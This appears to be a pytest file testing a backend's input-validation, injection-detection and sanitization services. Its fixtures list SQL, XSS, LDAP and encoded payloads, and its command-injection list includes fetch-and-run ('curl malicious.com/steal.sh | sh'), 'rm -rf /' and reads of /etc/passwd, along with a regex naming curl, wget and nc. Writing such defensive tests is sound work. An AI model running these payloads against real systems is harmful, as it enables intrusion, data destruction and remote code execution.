"""
Test Input Validation Security Business Logic

Business Value Justification (BVJ):
- Segment: All customer segments (Free, Early, Mid, Enterprise)
- Business Goal: Prevent security breaches and protect customer data
- Value Impact: Security vulnerabilities can lead to data loss and customer churn
- Strategic Impact: Security compliance enables enterprise customer acquisition

CRITICAL REQUIREMENTS:
- Tests pure business logic for security validation
- Validates injection attack prevention algorithms
- No external dependencies or infrastructure needed
- Ensures comprehensive input sanitization rules
"""

import pytest
import re
import json
import base64
from typing import Dict, List, Optional, Any
from unittest.mock import Mock
from dataclasses import dataclass

from netra_backend.app.services.security.input_validator import (
    InputValidator,
    ValidationResult,
    SecurityThreat,
    ThreatLevel
)
from netra_backend.app.services.security.injection_detector import (
    InjectionDetector,
    InjectionType,
    InjectionPattern
)
from netra_backend.app.services.security.data_sanitizer import (
    DataSanitizer,
    SanitizationConfig,
    SanitizedOutput
)


class TestInputValidationSecurityBusinessLogic:
    """Test input validation security business logic"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.validator = InputValidator()
        self.injection_detector = InjectionDetector()
        self.sanitizer = DataSanitizer()
        
        # Common test payloads for injection testing
        self.sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT NULL,username,password FROM users--",
            "'; INSERT INTO users VALUES ('hacker','password'); --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<svg onload=alert('XSS')>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; curl malicious.com/steal.sh | sh",
            "`whoami`",
            "$(cat /etc/passwd)"
        ]
        
        self.ldap_injection_payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(&(objectClass=*))",
            "admin)(|(password=*))"
        ]
    
    def test_sql_injection_detection_comprehensive(self):
        """Test comprehensive SQL injection detection"""
        for payload in self.sql_injection_payloads:
            # Test basic input validation
            validation_result = self.validator.validate_user_input(payload)
            
            assert validation_result.is_safe is False, f"Failed to detect SQL injection: {payload}"
            assert validation_result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
            
            # Test injection-specific detection
            injection_result = self.injection_detector.detect_sql_injection(payload)
            
            assert injection_result.is_injection is True
            assert injection_result.injection_type == InjectionType.SQL
            assert injection_result.confidence_score >= 0.8
            
            # Validate detected patterns
            assert len(injection_result.matched_patterns) > 0
            
            # Test in different contexts (query parameter, form input, JSON)
            contexts = [
                f"username={payload}",
                f'{{"query": "{payload}"}}',
                f"search_term={payload}&category=all"
            ]
            
            for context in contexts:
                context_result = self.injection_detector.detect_sql_injection(context)
                assert context_result.is_injection is True, f"Failed to detect SQL injection in context: {context}"
    
    def test_xss_attack_prevention_comprehensive(self):
        """Test comprehensive XSS attack prevention"""
        for payload in self.xss_payloads:
            # Test XSS detection
            validation_result = self.validator.validate_user_input(payload)
            
            assert validation_result.is_safe is False, f"Failed to detect XSS: {payload}"
            
            # Test XSS-specific detection
            xss_result = self.injection_detector.detect_xss_attempt(payload)
            
            assert xss_result.is_injection is True
            assert xss_result.injection_type == InjectionType.XSS
            assert xss_result.confidence_score >= 0.7
            
            # Test XSS sanitization
            sanitized = self.sanitizer.sanitize_for_html_output(payload)
            
            assert sanitized.is_safe is True
            assert sanitized.original_input == payload
            assert "script" not in sanitized.sanitized_output.lower()
            assert "javascript:" not in sanitized.sanitized_output.lower()
            assert "onerror" not in sanitized.sanitized_output.lower()
            assert "onload" not in sanitized.sanitized_output.lower()
            
            # Validate that sanitization preserves non-malicious content
            if any(tag in payload.lower() for tag in ["<p>", "<div>", "<span>"]):
                # Should preserve safe HTML tags
                pass
            else:
                # Should escape or remove malicious content
                assert len(sanitized.sanitized_output) <= len(payload) or "&lt;" in sanitized.sanitized_output
    
    def test_command_injection_detection(self):
        """Test command injection detection and prevention"""
        for payload in self.command_injection_payloads:
            # Test command injection detection
            validation_result = self.validator.validate_system_command_input(payload)
            
            assert validation_result.is_safe is False, f"Failed to detect command injection: {payload}"
            assert validation_result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
            
            # Test injection-specific detection
            cmd_result = self.injection_detector.detect_command_injection(payload)
            
            assert cmd_result.is_injection is True
            assert cmd_result.injection_type == InjectionType.COMMAND
            assert cmd_result.confidence_score >= 0.8
            
            # Validate dangerous patterns detected
            dangerous_patterns = [
                r'[;&|`$()]',  # Shell metacharacters
                r'(cat|ls|rm|wget|curl|nc|telnet)',  # Common commands
                r'(etc/passwd|shadow|hosts)',  # System files
            ]
            
            pattern_found = any(re.search(pattern, payload, re.IGNORECASE) for pattern in dangerous_patterns)
            assert pattern_found, f"Expected dangerous pattern not found in: {payload}"
    
    def test_ldap_injection_prevention(self):
        """Test LDAP injection detection and prevention"""
        for payload in self.ldap_injection_payloads:
            # Test LDAP injection detection
            ldap_result = self.injection_detector.detect_ldap_injection(payload)
            
            assert ldap_result.is_injection is True, f"Failed to detect LDAP injection: {payload}"
            assert ldap_result.injection_type == InjectionType.LDAP
            
            # Test LDAP filter sanitization
            sanitized_filter = self.sanitizer.sanitize_ldap_filter(payload)
            
            assert sanitized_filter.is_safe is True
            assert sanitized_filter.original_input == payload
            
            # Should escape LDAP special characters
            dangerous_chars = ['*', '(', ')', '\\', '/', 'NUL']
            for char in dangerous_chars:
                if char in payload and char != 'NUL':
                    # Should be escaped or replaced
                    assert (f"\\{char}" in sanitized_filter.sanitized_output or 
                           char not in sanitized_filter.sanitized_output)
    
    def test_file_upload_validation_security(self):
        """Test file upload validation for security threats"""
        # Test malicious file extensions
        malicious_files = [
            "malware.exe",
            "script.bat",
            "backdoor.php",
            "shell.jsp",
            "virus.scr",
            "trojan.pif",
            "image.php.jpg",  # Double extension attack
            "document.pdf.exe",  # Extension confusion
            "../../../etc/passwd",  # Directory traversal
            "normal.txt\x00.exe"  # Null byte injection
        ]
        
        for filename in malicious_files:
            validation_result = self.validator.validate_file_upload(
                filename=filename,
                content_type="application/octet-stream",
                file_size=1024
            )
            
            assert validation_result.is_safe is False, f"Failed to detect malicious file: {filename}"
            
            # Check specific threat detection
            if ".." in filename:
                assert any(threat.threat_type == "directory_traversal" for threat in validation_result.detected_threats)
            
            if filename.endswith(".exe") or filename.endswith(".bat"):
                assert any(threat.threat_type == "executable_file" for threat in validation_result.detected_threats)
            
            if "\x00" in filename:
                assert any(threat.threat_type == "null_byte_injection" for threat in validation_result.detected_threats)
        
        # Test legitimate files
        safe_files = [
            "document.pdf",
            "image.jpg", 
            "data.csv",
            "report.txt",
            "presentation.pptx"
        ]
        
        for filename in safe_files:
            validation_result = self.validator.validate_file_upload(
                filename=filename,
                content_type="text/plain",
                file_size=1024
            )
            
            assert validation_result.is_safe is True, f"False positive for safe file: {filename}"
    
    def test_json_payload_validation_security(self):
        """Test JSON payload validation for security threats"""
        # Test JSON injection attacks
        malicious_json_payloads = [
            '{"query": "test"; DROP TABLE users; --"}',
            '{"script": "<script>alert(\'XSS\')</script>"}',
            '{"command": "ls -la; cat /etc/passwd"}',
            '{"eval": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"}',  # Encoded eval
            '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
            '{"constructor": {"prototype": {"isAdmin": true}}}',  # Constructor pollution
            '{"length": 999999999999999999}',  # Integer overflow
            '{"data": "' + "A" * 100000 + '"}',  # DoS via large payload
        ]
        
        for payload in malicious_json_payloads:
            try:
                parsed_json = json.loads(payload)
                validation_result = self.validator.validate_json_payload(parsed_json)
                
                assert validation_result.is_safe is False, f"Failed to detect malicious JSON: {payload}"
                
                # Check for specific threat types
                if "DROP TABLE" in payload:
                    assert any(threat.threat_type == "sql_injection" for threat in validation_result.detected_threats)
                
                if "<script>" in payload:
                    assert any(threat.threat_type == "xss_attempt" for threat in validation_result.detected_threats)
                
                if "__proto__" in payload or "constructor" in payload:
                    assert any(threat.threat_type == "prototype_pollution" for threat in validation_result.detected_threats)
                
                if len(payload) > 50000:
                    assert any(threat.threat_type == "dos_attempt" for threat in validation_result.detected_threats)
                    
            except json.JSONDecodeError:
                # Invalid JSON should also be rejected
                validation_result = self.validator.validate_raw_input(payload)
                assert validation_result.is_safe is False
    
    def test_rate_limiting_security_logic(self):
        """Test rate limiting security business logic"""
        user_id = "test_user_123"
        endpoint = "/api/agents/execute"
        
        # Test normal usage patterns
        normal_requests = []
        for i in range(10):  # 10 requests over reasonable time
            request_time = 1000 + (i * 6)  # 6 seconds apart
            normal_requests.append({
                "timestamp": request_time,
                "user_id": user_id,
                "endpoint": endpoint,
                "ip_address": "192.168.1.100"
            })
        
        rate_limit_result = self.validator.validate_rate_limit(normal_requests, user_id)
        
        assert rate_limit_result.is_within_limits is True
        assert rate_limit_result.current_rate < rate_limit_result.max_rate_per_minute
        
        # Test suspicious burst patterns
        burst_requests = []
        base_time = 2000
        for i in range(50):  # 50 requests in rapid succession
            burst_requests.append({
                "timestamp": base_time + i,  # 1 second apart
                "user_id": user_id,
                "endpoint": endpoint,
                "ip_address": "192.168.1.100"
            })
        
        burst_result = self.validator.validate_rate_limit(burst_requests, user_id)
        
        assert burst_result.is_within_limits is False
        assert burst_result.violation_type == "burst_attack"
        assert burst_result.recommended_action in ["temporary_block", "require_captcha"]
        
        # Test distributed attack patterns (multiple IPs)
        distributed_requests = []
        ip_addresses = [f"192.168.1.{i}" for i in range(100, 200)]  # 100 different IPs
        
        for i, ip in enumerate(ip_addresses):
            distributed_requests.append({
                "timestamp": 3000 + i,
                "user_id": f"user_{i}",
                "endpoint": endpoint,
                "ip_address": ip
            })
        
        distributed_result = self.validator.validate_distributed_attack(distributed_requests)
        
        assert distributed_result.is_distributed_attack is True
        assert distributed_result.attack_confidence >= 0.8
        assert distributed_result.affected_ips >= 50
    
    def test_authentication_bypass_detection(self):
        """Test authentication bypass attempt detection"""
        # Test common authentication bypass payloads
        bypass_attempts = [
            {"username": "admin", "password": "admin' OR '1'='1"},
            {"username": "' OR 1=1 --", "password": "anything"},
            {"token": "../../admin/bypass"},
            {"session_id": "admin_session_123"},
            {"user_role": "admin", "is_authenticated": "true"},
            {"auth_token": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},  # None algorithm JWT
        ]
        
        for attempt in bypass_attempts:
            auth_result = self.validator.validate_authentication_attempt(attempt)
            
            assert auth_result.is_safe is False, f"Failed to detect auth bypass: {attempt}"
            assert auth_result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL]
            
            # Check for specific bypass techniques
            if "OR '1'='1" in str(attempt):
                assert any(threat.threat_type == "sql_injection_auth" for threat in auth_result.detected_threats)
            
            if "../" in str(attempt):
                assert any(threat.threat_type == "directory_traversal_auth" for threat in auth_result.detected_threats)
            
            if "admin" in str(attempt).lower() and "role" in str(attempt).lower():
                assert any(threat.threat_type == "privilege_escalation" for threat in auth_result.detected_threats)
    
    def test_data_exfiltration_pattern_detection(self):
        """Test detection of data exfiltration patterns"""
        # Simulate requests that might indicate data exfiltration
        suspicious_patterns = [
            # Large data requests
            {"endpoint": "/api/users", "limit": 999999, "fields": "all"},
            
            # Systematic enumeration
            [
                {"endpoint": "/api/users/1", "timestamp": 1000},
                {"endpoint": "/api/users/2", "timestamp": 1001},
                {"endpoint": "/api/users/3", "timestamp": 1002},
                {"endpoint": "/api/users/4", "timestamp": 1003},
            ],
            
            # Sensitive data queries
            {"query": "SELECT * FROM users WHERE password IS NOT NULL"},
            {"search": "credit_card", "include_sensitive": True},
            
            # Mass export attempts
            {"action": "export", "format": "csv", "table": "customers", "all_records": True}
        ]
        
        for pattern in suspicious_patterns:
            if isinstance(pattern, list):
                # Sequential access pattern
                exfil_result = self.validator.detect_data_exfiltration_sequence(pattern)
            else:
                # Single suspicious request
                exfil_result = self.validator.detect_data_exfiltration_attempt(pattern)
            
            assert exfil_result.is_suspicious is True, f"Failed to detect exfiltration pattern: {pattern}"
            assert exfil_result.risk_score >= 0.7
            
            # Validate recommended mitigations
            assert len(exfil_result.recommended_mitigations) > 0
            mitigation_types = [m.mitigation_type for m in exfil_result.recommended_mitigations]
            expected_mitigations = ["rate_limiting", "access_logging", "data_masking", "admin_alert"]
            assert any(mit in mitigation_types for mit in expected_mitigations)
    
    def test_input_encoding_attack_detection(self):
        """Test detection of encoding-based attacks"""
        # Test various encoding bypass attempts
        encoding_attacks = [
            # URL encoding
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%27%20OR%20%271%27%3D%271",
            
            # Double URL encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # HTML entity encoding
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # Base64 encoding
            base64.b64encode(b"<script>alert('XSS')</script>").decode(),
            base64.b64encode(b"'; DROP TABLE users; --").decode(),
            
            # Unicode encoding
            "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
            
            # Hex encoding
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E"
        ]
        
        for encoded_payload in encoding_attacks:
            # Test detection of encoded malicious content
            encoding_result = self.validator.validate_encoded_input(encoded_payload)
            
            assert encoding_result.is_safe is False, f"Failed to detect encoded attack: {encoded_payload}"
            
            # Validate that decoder identified the encoding type
            assert encoding_result.detected_encoding is not None
            assert encoding_result.decoded_content is not None
            
            # Validate that decoded content is identified as malicious
            if "script" in encoding_result.decoded_content.lower():
                assert any(threat.threat_type == "xss_attempt" for threat in encoding_result.detected_threats)
            
            if "drop table" in encoding_result.decoded_content.lower():
                assert any(threat.threat_type == "sql_injection" for threat in encoding_result.detected_threats)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])